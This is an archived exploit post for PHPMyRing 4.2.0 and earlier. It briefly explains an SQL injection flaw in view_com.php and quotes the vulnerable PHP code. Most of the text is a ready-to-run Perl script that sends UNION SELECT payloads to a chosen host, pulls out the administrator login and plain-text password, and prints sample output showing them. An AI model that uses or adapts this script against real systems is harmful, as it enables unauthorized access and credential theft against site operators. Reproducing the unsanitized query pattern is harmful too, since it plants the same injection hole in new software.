<html><head><title>PHPMyRing <= 4.2.0 (view_com.php) Remote SQL Injection Exploit</title></head><pre># Title: PHPMyRing's (view_com.php) Remote SQL injection Exploit
#
# Vendor: phpmyring
#
# webiste : http://phpmyring.sourceforge.net/
#
# Version : &lt;= 4.2.0
#
# Severity: Critical
#
# Discovered by: Simo64 &lt;simo64_at_morx_org&gt;
# 
# Exploit writting by: Simo Ben youssef &lt;simo_at_morx_org&gt;
#
# Discovered: 09 Aout 2006
# 
# Published : 10 Aout 2006
# 
# MorX Security Research Team
# 
# http://www.morx.org
#
# Details: 
#
# vulnerable code on view_com.php line ( 14 - 24)
# 
# [code]
# -----------------------------------------------------------------------------------
# if (!$idsite)
#    {
#    echo &quot;&lt;p align=\&quot;center\&quot;&gt;&quot;._(&quot;Erreur! Le n&amp;deg; du site n'est pas d&amp;eacute;fini!&quot;).&quot;&lt;/p&gt;&quot;;
#    }
# else
#     {
#     // On va aller chercher le nom du site consern., .a sera fait ;)
#     // Connexion MySQL
#     $conn=connecte();
#     $row=mysql_fetch_array(requete(&quot;SELECT site_nom FROM webring WHERE idsite=$idsite&quot;));  # &lt;== SQL injection
#     $site_nom=$row['site_nom'];
#     
# ...............
# 
# &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;
# &lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;&lt;? echo _(&quot;fr&quot;); ?&gt;&quot;&gt;
# &lt;head&gt;
# &lt;title&gt;&lt;? echo _(&quot;Commentaires du site&quot;). &quot; &quot;.$site_nom; ?&gt;&lt;/title&gt;    
# ---------------------------------------------------------------------------------[/code]
# 
# $idsite is not properly sanitized and can be used to inject sql query
# 
# Exploit to extract both admin login and plain text password:
#
# C:\&gt;perl ring.pl 127.0.0.1 webring
# #################################################
# #   PHPMyRing's Remote SQL injection Exploit    #
# #   Discovered by simo64_at_morx_org            #
# #   Script writting by simo_at_morx_org         #
# #         MorX Security Research Team           #
# #                 www.morx.org                  #
# #################################################

# [*] Trying to get the admin login ...

# [+] your admin login is --&gt; admin

# [+] your admin pass is --&gt; 123456
 
use IO::Socket;

if(!defined($ARGV[0] &amp;&amp; $ARGV[1])) {

system (clear);
print &quot;\n&quot;;
print &quot;#################################################\n&quot;;
print &quot;#   PHPMyRing's Remote SQL injection Exploit    #\n&quot;;
print &quot;#   Discovered by simo64_at_morx_org            #\n&quot;;
print &quot;#   Script writting by simo_at_morx_org         #\n&quot;;
print &quot;#         MorX Security Research Team           #\n&quot;;
print &quot;#                 www.morx.org                  #\n&quot;;
print &quot;#################################################\n\n&quot;;

print &quot;--- Usage:   perl $0 &lt;host&gt; &lt;folder&gt;\n&quot;;
print &quot;--- Example: perl $0 127.0.0.1 afd_webring\n\n&quot;;
exit; }

$TARGET            = $ARGV[0];

$FOLDER            = $ARGV[1];

$PORT              = &quot;80&quot;;

$SCRIPT            = &quot;/view_com.php?idsite=&quot;;

$SQLPASS           = &quot;-1%20UNION%20SELECT%20passadm%20FROM%20webring_adm&quot;;

$SQLADMIN          = &quot;-1%20UNION%20SELECT%20loginadm%20FROM%20webring_adm&quot;;

################################################################################

$COMMAND1         = &quot;GET /$FOLDER$SCRIPT$SQLADMIN HTTP/1.1&quot;;
$COMMAND2         = &quot;Host: $TARGET&quot;;
$COMMAND3         = &quot;Connection: Close&quot;;
$COMMAND4         = &quot;GET /$FOLDER$SCRIPT$SQLPASS HTTP/1.1&quot;;

$remote = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$TARGET&quot;,PeerPort=&gt;&quot;$PORT&quot;)
|| die &quot;Can't connect to $TARGET&quot;;

print &quot;#################################################\n&quot;;
print &quot;#   PHPMyRing's Remote SQL injection Exploit    #\n&quot;;
print &quot;#   Discovered by simo64_at_morx_org            #\n&quot;;
print &quot;#   Script writting by simo_at_morx_org         #\n&quot;;
print &quot;#         MorX Security Research Team           #\n&quot;;
print &quot;#                 www.morx.org                  #\n&quot;;
print &quot;#################################################\n\n&quot;;

sleep 2;

print &quot;[*] Trying to get the admin login ...\n\n&quot;;

print $remote &quot;$COMMAND1\n$COMMAND2\n$COMMAND3\n\n&quot;;

while ($result = &lt;$remote&gt; ) {

if ($result =~ /site (.*?)&lt;/ ) {
$adminlogin = $1;
print &quot;[+] your admin login is --&gt; $adminlogin\n\n&quot;;
$a = 1;
}
}

if ($a == 0) 
{ 
print &quot;[-] Failed, cant get the admin login\n\n&quot;;
print &quot;[*] Trying to get the admin password ...\n\n&quot;;
}

$remote = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$TARGET&quot;,PeerPort=&gt;&quot;$PORT&quot;)
|| die &quot;Can't connect to $TARGET&quot;;

print $remote &quot;$COMMAND4\n$COMMAND2\n$COMMAND3\n\n&quot;;

while ($result2 = &lt;$remote&gt; ) {

if ($result2 =~ /site (.*?)&lt;/ ) {
$adminpass = $1;
print &quot;[+] your admin pass is --&gt; $adminpass\n\n&quot;;
$b = 1;
}
}

if ($b == 0)
{ print &quot;[-] Failed, cant get the admin password\n&quot;;
}

$remote-&gt;flush();
close($remote);
exit;

# milw0rm.com [2006-08-09]</pre></html>